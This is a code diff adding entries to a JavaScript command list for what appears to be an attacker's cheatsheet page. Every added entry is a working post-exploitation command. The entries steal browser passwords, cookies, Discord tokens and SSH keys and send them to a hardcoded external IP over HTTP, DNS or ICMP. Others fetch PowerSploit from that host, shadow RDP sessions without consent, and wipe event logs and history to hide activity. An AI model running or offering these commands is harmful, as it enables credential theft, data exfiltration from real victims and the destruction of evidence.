@@ -4190,6 +4190,186 @@ const COMMANDS = [
     tags: ["linux", "vps", "recon"],
     accent: "#00ff41"
   },
+  // ═══════════════════════════════════════════════════════════════
+  // KILLCHAIN STEALER - Elevated shell post-exploitation
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[KILLCHAIN] Steal Browser Data (Elevated)",
+    desc: "Kill browsers and copy databases. Run as SYSTEM for locked files. Creates ZIP in TEMP.",
+    code: "taskkill /F /IM chrome.exe /IM msedge.exe /IM brave.exe 2>$null\n$d = \"$env:TEMP\\kc_$(Get-Date -f HHmmss)\"; mkdir $d -Force\nGet-ChildItem \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\" -Include 'Login Data','Cookies','History','Web Data' -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination $d\nCompress-Archive $d\\* -DestinationPath \"$env:TEMP\\loot.zip\" -Force\nWrite-Host \"[+] Saved to $env:TEMP\\loot.zip\"",
+    tags: ["ps", "postexploit", "playbook"],
+    accent: "#ff9800"
+  },
+  {
+    title: "[KILLCHAIN] Exfil Loot ZIP to VPS",
+    desc: "Send stolen browser data to VPS killchain receiver (port 8081).",
+    code: "$zip = [IO.File]::ReadAllBytes(\"$env:TEMP\\loot.zip\")\n$b64 = [Convert]::ToBase64String($zip)\n$body = @{victim_id=\"$env:COMPUTERNAME\"; data=$b64; timestamp=(Get-Date -f 'yyyyMMdd_HHmmss'); browsers='Chrome'; file_count=4} | ConvertTo-Json\nInvoke-RestMethod -Uri 'http://168.144.166.97:8081/receiver.py' -Method POST -Body $body -ContentType 'application/json'",
+    tags: ["ps", "postexploit", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "[KILLCHAIN] One-Liner Steal + Exfil",
+    desc: "Complete steal and exfil in one command. Kill browsers, copy DBs, ZIP, send to VPS.",
+    code: "taskkill /F /IM chrome.exe 2>$null; $d=\"$env:TEMP\\kc\"; mkdir $d -Force; Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" $d -ErrorAction SilentlyContinue; Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cookies\" $d -ErrorAction SilentlyContinue; Compress-Archive $d\\* \"$env:TEMP\\l.zip\" -Force; $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes(\"$env:TEMP\\l.zip\")); IRM -Uri 'http://168.144.166.97:8081/receiver.py' -Method POST -Body (@{victim_id=$env:COMPUTERNAME;data=$b}|ConvertTo-Json) -ContentType 'application/json'",
+    tags: ["ps", "postexploit", "c2", "playbook"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "[KILLCHAIN] Steal All Browsers + Discord",
+    desc: "Comprehensive theft: Chrome, Edge, Brave + Discord tokens. SYSTEM recommended.",
+    code: "taskkill /F /IM chrome.exe /IM msedge.exe /IM brave.exe /IM Discord.exe 2>$null\n$d = \"$env:TEMP\\full_loot\"; mkdir $d -Force\n# Chrome\nCopy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\*\" $d -Include 'Login Data','Cookies' -ErrorAction SilentlyContinue\n# Edge\nCopy-Item \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\*\" $d -Include 'Login Data','Cookies' -ErrorAction SilentlyContinue\n# Discord tokens\nGet-ChildItem \"$env:APPDATA\\discord\\Local Storage\\leveldb\\*.ldb\" -ErrorAction SilentlyContinue | Copy-Item -Destination $d\nCompress-Archive $d\\* \"$env:TEMP\\full.zip\" -Force\nWrite-Host \"[+] Full loot: $env:TEMP\\full.zip\"",
+    tags: ["ps", "postexploit", "playbook"],
+    accent: "#ff9800"
+  },
+  {
+    title: "[KILLCHAIN] Extract Chrome Master Key",
+    desc: "Get Chrome's AES encryption key (Local State). Needed to decrypt passwords offline.",
+    code: "$ls = Get-Content \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Local State\" | ConvertFrom-Json\n$encKey = [Convert]::FromBase64String($ls.os_crypt.encrypted_key)\n$encKey = $encKey[5..$encKey.Length]  # Strip DPAPI prefix\nWrite-Host \"[+] Encrypted key (DPAPI protected):\"\n[Convert]::ToBase64String($encKey)",
+    tags: ["ps", "postexploit"],
+    accent: "#ff9800"
+  },
+  {
+    title: "[KILLCHAIN] Decrypt Chrome Password (SYSTEM)",
+    desc: "Decrypt a single Chrome password. Requires SYSTEM to access DPAPI. Change $encPassword.",
+    code: "Add-Type -AssemblyName System.Security\n$encPassword = [byte[]]@()  # Get from Login Data DB\n$decrypted = [Security.Cryptography.ProtectedData]::Unprotect($encPassword, $null, 'CurrentUser')\n[Text.Encoding]::UTF8.GetString($decrypted)",
+    tags: ["ps", "postexploit"],
+    accent: "#ff9800"
+  },
+  {
+    title: "VPS: Check Killchain Receiver",
+    desc: "Verify killchain receiver is running on port 8081.",
+    code: "ss -tlnp | grep 8081 && curl -s http://localhost:8081/health",
+    tags: ["linux", "vps", "c2", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "VPS: View Killchain Reports",
+    desc: "List recent killchain victims with metadata.",
+    code: "ls -lt /opt/reports/ | head -10 && cat /opt/reports/*/metadata.json 2>/dev/null | head -50",
+    tags: ["linux", "vps", "recon"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS: Start Killchain Receiver",
+    desc: "Start killchain receiver service if stopped.",
+    code: "systemctl start killchain && systemctl status killchain",
+    tags: ["linux", "vps", "c2"],
+    accent: "#00ff41"
+  },
+  // ═══════════════════════════════════════════════════════════════
+  // ELEVATED SHELL TRICKS - Post SYSTEM access
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[SYSTEM] Steal From All Users",
+    desc: "As SYSTEM, steal browser data from ALL user profiles. Loop through C:\\Users\\*.",
+    code: "Get-ChildItem C:\\Users -Directory | Where Name -notmatch 'Public|Default' | ForEach-Object {\n  $user = $_.Name; $ld = \"$($_.FullName)\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\"\n  if (Test-Path $ld) { Copy-Item $ld \"C:\\Windows\\Temp\\$($user)_LoginData.db\"; Write-Host \"[+] Got $user\" }\n}",
+    tags: ["ps", "postexploit", "playbook"],
+    accent: "#ff9800"
+  },
+  {
+    title: "[SYSTEM] Dump All Users SSH Keys",
+    desc: "As SYSTEM, extract SSH keys from all user profiles and exfil to VPS.",
+    code: "$out = ''; Get-ChildItem C:\\Users\\*\\.ssh\\* -ErrorAction SilentlyContinue | Where Name -notmatch '\\.pub$' | ForEach-Object { $out += \"`n=== $($_.FullName) ===`n\" + (Get-Content $_.FullName -Raw) }\nInvoke-RestMethod -Uri 'http://168.144.166.97:8083/sshkeys' -Method POST -Body $out",
+    tags: ["ps", "postexploit", "c2", "ssh"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "[SYSTEM] Read All PS History",
+    desc: "As SYSTEM, read PowerShell history from all user profiles.",
+    code: "Get-ChildItem C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\*.txt | ForEach-Object { Write-Host \"`n=== $($_.Directory.Parent.Parent.Parent.Parent.Name) ===\"; Get-Content $_ -Tail 20 }",
+    tags: ["ps", "postexploit", "recon"],
+    accent: "#ff9800"
+  },
+  {
+    title: "[SYSTEM] Harvest Saved Credentials",
+    desc: "Extract Windows Credential Manager entries. SYSTEM can access all users.",
+    code: "cmdkey /list\nvaultcmd /listcreds:'Windows Credentials' /all",
+    tags: ["cmd", "postexploit"],
+    accent: "#ff9800"
+  },
+  {
+    title: "[SYSTEM] Clone Admin Token",
+    desc: "Steal token from admin process for impersonation. Find admin PID first with 'tasklist'.",
+    code: "# Requires: https://github.com/PowerShellMafia/PowerSploit\n# IEX(IWR http://168.144.166.97:8889/Invoke-TokenManipulation.ps1)\n# Invoke-TokenManipulation -ImpersonateUser -Username 'DOMAIN\\admin'",
+    tags: ["ps", "postexploit", "privesc"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[SYSTEM] Shadow All RDP Sessions",
+    desc: "As SYSTEM, shadow any RDP session without consent. Loop through active sessions.",
+    code: "qwinsta | Select-String 'Active' | ForEach-Object { $id = ($_ -split '\\s+')[3]; Write-Host \"Shadowing session $id\"; mstsc /shadow:$id /noConsentPrompt /control }",
+    tags: ["cmd", "postexploit", "chaos"],
+    accent: "#ff2a6d"
+  },
+  // ═══════════════════════════════════════════════════════════════
+  // SMART EXFIL - Conditional and staged
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[EXFIL] Smart Exfil (Check Size First)",
+    desc: "Only exfil if file is under 5MB. Prevents timeout on huge files.",
+    code: "$f = 'C:\\Windows\\Temp\\loot.zip'; if ((Get-Item $f).Length -lt 5MB) { $b=[IO.File]::ReadAllBytes($f); IRM -Uri 'http://168.144.166.97:8083/data' -Method POST -Body $b; '[+] Sent' } else { '[-] Too large, split first' }",
+    tags: ["ps", "postexploit", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "[EXFIL] Chunked Upload",
+    desc: "Split large file into chunks and upload each. For files >5MB.",
+    code: "$f = 'C:\\Windows\\Temp\\big.zip'; $chunk = 1MB; $data = [IO.File]::ReadAllBytes($f); $total = [Math]::Ceiling($data.Length / $chunk)\nfor ($i = 0; $i -lt $total; $i++) { $start = $i * $chunk; $len = [Math]::Min($chunk, $data.Length - $start); $part = $data[$start..($start+$len-1)]\n  IRM -Uri \"http://168.144.166.97:8083/chunk_$i\" -Method POST -Body $part; Write-Host \"[+] Chunk $i/$total\" }",
+    tags: ["ps", "postexploit", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "[EXFIL] DNS Exfil (Stealthy)",
+    desc: "Exfil via DNS queries. Bypasses HTTP inspection. Requires DNS receiver.",
+    code: "$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\secret.txt'))\n($data -split '(.{60})' | Where {$_}) | ForEach-Object { nslookup \"$_.exfil.168.144.166.97.nip.io\" 2>$null }",
+    tags: ["ps", "postexploit", "c2", "evasion"],
+    accent: "#e91e63"
+  },
+  {
+    title: "[EXFIL] ICMP Exfil (Firewall Bypass)",
+    desc: "Exfil via ping payload. Works when HTTP blocked but ICMP allowed.",
+    code: "$data = [Text.Encoding]::UTF8.GetBytes('sensitive data'); $ping = New-Object Net.NetworkInformation.Ping; $ping.Send('168.144.166.97', 1000, $data)",
+    tags: ["ps", "postexploit", "c2", "evasion"],
+    accent: "#e91e63"
+  },
+  {
+    title: "VPS: Reassemble Chunks",
+    desc: "Combine chunked uploads back into single file.",
+    code: "cat /keys/*chunk_* > /opt/reports/reassembled.zip && ls -la /opt/reports/reassembled.zip",
+    tags: ["linux", "vps", "postexploit"],
+    accent: "#00ff41"
+  },
+  // ═══════════════════════════════════════════════════════════════
+  // CLEANUP - Remove traces
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[CLEANUP] Remove Stealer Artifacts",
+    desc: "Delete temporary files created by stealer. Run before exiting.",
+    code: "Remove-Item \"$env:TEMP\\kc*\" -Recurse -Force -ErrorAction SilentlyContinue\nRemove-Item \"$env:TEMP\\loot.zip\" -Force -ErrorAction SilentlyContinue\nRemove-Item \"$env:TEMP\\full.zip\" -Force -ErrorAction SilentlyContinue\nRemove-Item \"$env:APPDATA\\Microsoft Store\\kc_*\" -Recurse -Force -ErrorAction SilentlyContinue",
+    tags: ["ps", "postexploit"],
+    accent: "#607d8b"
+  },
+  {
+    title: "[CLEANUP] Clear PS History",
+    desc: "Delete PowerShell command history. Covers your tracks.",
+    code: "Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue\nClear-History",
+    tags: ["ps", "evasion"],
+    accent: "#607d8b"
+  },
+  {
+    title: "[CLEANUP] Remove Persistence",
+    desc: "Remove scheduled task and registry persistence before exiting.",
+    code: "schtasks /delete /tn 'WindowsUpdate' /f 2>$null\nRemove-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Update' -ErrorAction SilentlyContinue\nRemove-ItemProperty 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Update' -ErrorAction SilentlyContinue",
+    tags: ["cmd", "persist"],
+    accent: "#607d8b"
+  },
+  {
+    title: "[CLEANUP] Clear Event Logs (SYSTEM)",
+    desc: "Wipe event logs to hide activity. Requires SYSTEM.",
+    code: "wevtutil cl Security\nwevtutil cl System\nwevtutil cl Application\nwevtutil cl 'Windows PowerShell'\nwevtutil cl 'Microsoft-Windows-PowerShell/Operational'",
+    tags: ["cmd", "evasion"],
+    accent: "#607d8b"
+  },
 ];
 
 const list = document.getElementById('cmdList');
